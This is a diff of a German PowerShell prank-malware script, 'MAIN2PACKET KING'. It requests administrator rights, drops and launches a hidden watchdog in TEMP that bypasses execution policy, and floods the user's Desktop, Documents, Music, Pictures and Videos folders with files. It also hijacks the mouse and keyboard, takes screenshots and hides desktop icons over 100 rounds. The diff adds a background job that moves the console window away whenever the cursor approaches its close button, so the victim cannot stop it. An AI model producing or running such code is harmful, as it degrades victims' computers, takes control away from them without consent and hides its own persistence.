@@ -1,5 +1,5 @@
 # ================================
-# ULTIMATIVE 20-in-1 TROLL KOLLEKTION - MAIN2PACKET KING
+# MAIN2PACKET KING - DAS SPRINGENDE FENSTER
 # ================================
 
 # Administrator-Rechte anfordern
@@ -10,17 +10,101 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 
 # ===== ERROR HANDLING =====
 $ErrorActionPreference = "SilentlyContinue"
-$Host.UI.RawUI.WindowTitle = "Main2packet System"  # Unauffälliger Titel
+$Host.UI.RawUI.WindowTitle = "Main2packet System"
 
-# ===== KONFIGURATION =====
-$global:trollActive = $true
-$global:currentRound = 0
-$global:maxRounds = 100
-$desktop = [Environment]::GetFolderPath("Desktop")
-$documents = [Environment]::GetFolderPath("MyDocuments")
-$music = [Environment]::GetFolderPath("MyMusic")
-$pictures = [Environment]::GetFolderPath("MyPictures")
-$videos = [Environment]::GetFolderPath("MyVideos")
+# ===== WINDOW SCHUTZ - DAS FENSTER SPRINGT WEG! =====
+Add-Type -Name Window -Namespace Console -MemberDefinition @'
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+[DllImport("User32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+[DllImport("User32.dll")]
+public static extern bool SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
+[DllImport("user32.dll")]
+public static extern bool GetCursorPos(ref System.Drawing.Point lpPoint);
+[DllImport("user32.dll")]
+public static extern int GetSystemMetrics(int nIndex);
+'@
+
+# Konstanten
+$HWND_TOPMOST = -1
+$SWP_NOSIZE = 0x0001
+$SWP_SHOWWINDOW = 0x0040
+$SM_XVIRTUALSCREEN = 76
+$SM_YVIRTUALSCREEN = 77
+$SM_CXVIRTUALSCREEN = 78
+$SM_CYVIRTUALSCREEN = 79
+
+$consoleHandle = [Console.Window]::GetConsoleWindow()
+$windowWidth = 800
+$windowHeight = 600
+
+# Bildschirmgröße ermitteln
+$screenWidth = [Console.Window]::GetSystemMetrics($SM_CXVIRTUALSCREEN)
+$screenHeight = [Console.Window]::GetSystemMetrics($SM_CYVIRTUALSCREEN)
+
+# Zufällige Positionen (über den ganzen Bildschirm verteilt)
+$positions = @()
+for ($i = 1; $i -le 20; $i++) {
+    $positions += @(
+        @(Get-Random -Minimum 50 -Maximum ($screenWidth - $windowWidth - 50)),
+        @(Get-Random -Minimum 50 -Maximum ($screenHeight - $windowHeight - 50))
+    )
+}
+
+# ===== MAUS-ÜBERWACHUNG =====
+$mouseJob = Start-Job -ScriptBlock {
+    param($positions, $consoleHandle, $HWND_TOPMOST, $SWP_NOSIZE, $SWP_SHOWWINDOW, $windowWidth, $windowHeight)
+    
+    Add-Type -Name Window -Namespace Console -MemberDefinition @'
+[DllImport("user32.dll")]
+public static extern bool GetCursorPos(ref System.Drawing.Point lpPoint);
+[DllImport("user32.dll")]
+public static extern bool SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
+[DllImport("user32.dll")]
+public static extern int GetSystemMetrics(int nIndex);
+'@
+    
+    # Bereich wo das X ist (rechte obere Ecke)
+    $xButtonZone = 30  # Pixel vom rechten Rand
+    $yButtonZone = 20   # Pixel vom oberen Rand
+    
+    while ($true) {
+        # Aktuelle Mausposition
+        $cursorPos = New-Object System.Drawing.Point
+        [Console.Window]::GetCursorPos([ref]$cursorPos)
+        
+        # Aktuelle Fensterposition
+        $windowPos = Get-Process -Name "powershell" | Where-Object {$_.MainWindowTitle -like "*Main2packet*"} | Select-Object -First 1
+        if ($windowPos) {
+            $windowRect = New-Object System.Drawing.Rectangle
+            $windowRect.X = $windowPos.MainWindowRect.X
+            $windowRect.Y = $windowPos.MainWindowRect.Y
+            $windowRect.Width = $windowPos.MainWindowRect.Width
+            $windowRect.Height = $windowPos.MainWindowRect.Height
+            
+            # Prüfen ob Maus über dem X ist
+            $xButtonX = $windowRect.X + $windowRect.Width - $xButtonZone
+            $xButtonY = $windowRect.Y + $yButtonZone
+            
+            $mouseOverX = ($cursorPos.X -ge $xButtonX -and 
+                          $cursorPos.X -le $xButtonX + 30 -and
+                          $cursorPos.Y -ge $windowRect.Y -and 
+                          $cursorPos.Y -le $windowRect.Y + 30)
+            
+            if ($mouseOverX) {
+                # FENSTER SPRINGT WEG! 🎯
+                $randomIndex = Get-Random -Minimum 0 -Maximum ($positions.Count / 2)
+                $newX = $positions[$randomIndex * 2]
+                $newY = $positions[$randomIndex * 2 + 1]
+                
+                [Console.Window]::SetWindowPos($consoleHandle, $HWND_TOPMOST, $newX, $newY, 0, 0, $SWP_NOSIZE -bor $SWP_SHOWWINDOW)
+                Start-Sleep -Milliseconds 500  # Kurze Pause nach dem Sprung
+            }
+        }
+        Start-Sleep -Milliseconds 50  # Sehr oft prüfen
+    }
+} -ArgumentList $positions, $consoleHandle, $HWND_TOPMOST, $SWP_NOSIZE, $SWP_SHOWWINDOW, $windowWidth, $windowHeight
 
 # ===== WATCHDOG =====
 $watchdogScript = @"
@@ -35,46 +119,55 @@ while(`$true) {
 $watchdogScript | Out-File "$env:TEMP\main2packet.ps1" -Encoding UTF8 -Force
 Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\main2packet.ps1`""
 
+# ===== KONFIGURATION =====
+$global:currentRound = 0
+$global:maxRounds = 100
+$desktop = [Environment]::GetFolderPath("Desktop")
+$documents = [Environment]::GetFolderPath("MyDocuments")
+$music = [Environment]::GetFolderPath("MyMusic")
+$pictures = [Environment]::GetFolderPath("MyPictures")
+$videos = [Environment]::GetFolderPath("MyVideos")
+
 # ===== START =====
 Clear-Host
 Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Red
-Write-Host "║      👑 MAIN2PACKET KING SYSTEM 👑        ║" -ForegroundColor Red
+Write-Host "║   👑 MAIN2PACKET KING - SPRINGENDES FENSTER 👑" -ForegroundColor Red
 Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Red
 Write-Host ""
 Write-Host "📊 Fortschritt: 0/$global:maxRounds" -ForegroundColor Yellow
+Write-Host "🎯 Versuch das X zu treffen - Das Fenster springt weg!" -ForegroundColor Cyan
 Write-Host ""
-Start-Sleep -Seconds 2
+Start-Sleep -Seconds 3
 
 # Hauptschleife - 100 MAL!
 while ($global:currentRound -lt $global:maxRounds) {
     $global:currentRound++
     
     # Fortschritt ANZEIGEN
-    if ($global:currentRound -le $global:maxRounds) {
-        Clear-Host
-        Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Red
-        Write-Host "║      👑 MAIN2PACKET KING SYSTEM 👑        ║" -ForegroundColor Red
-        Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Red
-        Write-Host ""
-        Write-Host "📊 Fortschritt: $global:currentRound/$global:maxRounds" -ForegroundColor Green
-        Write-Host ""
-    }
+    Clear-Host
+    Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Red
+    Write-Host "║   👑 MAIN2PACKET KING - SPRINGENDES FENSTER 👑" -ForegroundColor Red
+    Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Red
+    Write-Host ""
+    Write-Host "📊 Fortschritt: $global:currentRound/$global:maxRounds" -ForegroundColor Green
+    Write-Host "🎯 Versuch mich zu schließen... wenn du kannst!" -ForegroundColor Yellow
+    Write-Host ""
     
-    # TROLL 1: Desktop Dateien - MAIN2PACKET KING
+    # TROLL 1: Desktop Dateien
     Write-Host "[1/20] 📂 Phase 1..." -ForegroundColor Green
     for ($i = 1; $i -le 10; $i++) {
         $filePath = Join-Path $desktop "MAIN2PACKET_KING_$global:currentRound`_$i.king"
         "👑 Main2packet King - Datei $i - Runde $global:currentRound" | Out-File $filePath -Encoding UTF8
     }
     
-    # TROLL 2: Ordner - MAIN2PACKET KING
+    # TROLL 2: Ordner
     Write-Host "[2/20] 📁 Phase 2..." -ForegroundColor Green
     for ($i = 1; $i -le 5; $i++) {
         $name = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})
         New-Item -Path "$desktop\MAIN2PACKET_KING_$name" -ItemType Directory -Force | Out-Null
     }
     
-    # TROLL 3: Maus kurz
+    # TROLL 3: Maus
     Write-Host "[3/20] 🖱️ Phase 3..." -ForegroundColor Green
     Add-Type -AssemblyName System.Windows.Forms
     for ($i = 1; $i -le 5; $i++) {
@@ -100,7 +193,7 @@ while ($global:currentRound -lt $global:maxRounds) {
     $wsh.SendKeys('{NUMLOCK}')
     Start-Sleep -Milliseconds 100
     
-    # TROLL 6: Screenshot mit MAIN2PACKET KING Namen
+    # TROLL 6: Screenshot
     Write-Host "[6/20] 📸 Phase 6..." -ForegroundColor Green
     Add-Type -AssemblyName System.Windows.Forms
     $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
@@ -111,19 +204,18 @@ while ($global:currentRound -lt $global:maxRounds) {
     $graphics.Dispose()
     $bitmap.Dispose()
     
-    # TROLL 7: Popup mit MAIN2PACKET KING
+    # TROLL 7: Popup
     Write-Host "[7/20] 💬 Phase 7..." -ForegroundColor Green
     $popup = New-Object -ComObject Wscript.Shell
-    $popup.Popup("👑 MAIN2PACKET KING - Runde $global:currentRound/$global:maxRounds", 1, "KING SYSTEM", 64)
+    $popup.Popup("👑 MAIN2PACKET KING - Runde $global:currentRound/$global:maxRounds`n`nVersuchs nochmal mit dem X!", 2, "KING SYSTEM", 64)
     
     # TROLL 8: Farbwechsel
     Write-Host "[8/20] 🎨 Phase 8..." -ForegroundColor Green
     $colors = @("Red", "Green", "Blue", "Yellow", "Cyan", "Magenta")
     $color = Get-Random $colors
     $Host.UI.RawUI.BackgroundColor = $color
-    Clear-Host
     
-    # TROLL 9: Kopien mit MAIN2PACKET KING
+    # TROLL 9: Kopien
     Write-Host "[9/20] 📋 Phase 9..." -ForegroundColor Green
     for ($i = 1; $i -le 3; $i++) {
         $filePath = Join-Path $desktop "MAIN2PACKET_KING_COPY_$global:currentRound`_$i.king"
@@ -132,25 +224,24 @@ while ($global:currentRound -lt $global:maxRounds) {
     
     # TROLL 10: Auto-Typing
     Write-Host "[10/20] ⌨️ Phase 10..." -ForegroundColor Green
-    $wsh = New-Object -ComObject WScript.Shell
     $wsh.SendKeys('Main2packet King... ')
     
-    # TROLL 11: Dokumente mit MAIN2PACKET KING
+    # TROLL 11: Dokumente
     Write-Host "[11/20] 📄 Phase 11..." -ForegroundColor Green
     for ($i = 1; $i -le 3; $i++) {
         $filePath = Join-Path $documents "MAIN2PACKET_KING_DOC_$global:currentRound`_$i.king"
         "👑 Dokument $i - Runde $global:currentRound" | Out-File $filePath -Encoding UTF8
     }
     
-    # TROLL 12: Musik mit MAIN2PACKET KING
+    # TROLL 12: Musik
     Write-Host "[12/20] 🎵 Phase 12..." -ForegroundColor Green
     New-Item -Path "$music\MAIN2PACKET_KING_$global:currentRound" -ItemType Directory -Force | Out-Null
     
-    # TROLL 13: Bilder mit MAIN2PACKET KING
+    # TROLL 13: Bilder
     Write-Host "[13/20] 🖼️ Phase 13..." -ForegroundColor Green
     New-Item -Path "$pictures\MAIN2PACKET_KING_$global:currentRound" -ItemType Directory -Force | Out-Null
     
-    # TROLL 14: Videos mit MAIN2PACKET KING
+    # TROLL 14: Videos
     Write-Host "[14/20] 🎬 Phase 14..." -ForegroundColor Green
     New-Item -Path "$videos\MAIN2PACKET_KING_$global:currentRound" -ItemType Directory -Force | Out-Null
     
@@ -207,7 +298,7 @@ public static extern int ShowWindow(IntPtr hwnd, int nCmdShow);
     }
     
     # TROLL 20: Icons
-    Write-Host "[20/20] 🖼️ Phase 20..." -ForegroundColor Green
+    Write-Host "[20/20] 🖼️ Phase 20...`n" -ForegroundColor Green
     $signature = @'
 [DllImport("user32.dll")]
 public static extern IntPtr FindWindow(string className, string windowName);
@@ -225,8 +316,9 @@ public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
         $type::ShowWindow($defview, 1)
     }
     
-    # Kurze Pause zwischen Runden
-    Start-Sleep -Seconds 1
+    Write-Host "✅ Runde $global:currentRound abgeschlossen!" -ForegroundColor Yellow
+    Write-Host "🎯 Nächste Runde in 3 Sekunden... (Das X wartet!)" -ForegroundColor Cyan
+    Start-Sleep -Seconds 3
 }
 
 # ===== STILLES ENDE =====
